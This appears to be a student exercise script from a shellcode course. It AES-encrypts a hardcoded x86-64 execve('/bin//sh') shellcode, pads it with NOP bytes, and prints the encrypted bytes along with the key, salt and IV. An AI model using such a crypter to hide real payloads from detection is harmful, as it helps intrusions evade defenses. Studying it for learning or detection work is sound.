#!/usr/bin/env python

####################################################
#
# shellcode-crypter.py
# by Michael Born (@blu3gl0w13)
# Student ID: SLAE64-1439
# November 8, 2016
#
####################################################

# Imports

from Crypto.Cipher import AES
import sys
#import argparse
import os
import hashlib


#---------------------------------------
#
# Define our Encryption Functions
#
#--------------------------------------

def aesCrypter(key, shellcode):
  salt = os.urandom(16)
  initVector = os.urandom(16)
  hashedKey = hashlib.sha256(key + salt).digest()
  mode = AES.MODE_CBC
  encrypterObject = AES.new(hashedKey, mode, initVector)
  messageToEncrypt = shellcode
  cipherText = initVector + salt + encrypterObject.encrypt(messageToEncrypt)
  print "\n\n[+] RAW AES Encrypted Shellcode: \n%s" % cipherText.encode('hex')
  print "\nShellcode Length: %d" % len(cipherText)
  print "\nKey: %s" % key
  print "\nHashedkey: %s Len: %d" % (hashedKey.encode('hex'), len(hashedKey))
  print "\nSalt: %s Len: %d" % (salt.encode('hex'), len(salt))
  print "\nIV: %s Len: %d\n\n" % (initVector.encode('hex'), len(initVector))
  encShellcode = ''

  for i in bytearray(cipherText):
    encShellcode += '\\x%02x' % i

  print '\n[+] Encrypted Shellcode: "%s"\n\n' % encShellcode
  sys.exit(0)

def main():
  # Setup the argument parser

#  parser = argparse.ArgumentParser()
#  parser.add_argument("-s", "--shellcode", help="Shellcode to encrypt", dest='shellcode', required=True)
#  parser.add_argument('-k', '--key', help='AES key to use for encryption', dest='key', required=True)
#  options = parser.parse_args()

  # Prepare some objects

#  key = options.key
#  shellcode = options.shellcode


  shellcode = "\x48\x31\xc0\x50\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x48\x89\xe2\x57\x48\x89\xe6\x48\x83\xc0\x3b\x0f\x05"

  key = 'clubjk'

  while (len(shellcode) % 16 !=0):
    shellcode += "\x90"

  aesCrypter(key, shellcode)


if __name__ == "__main__":
  main()
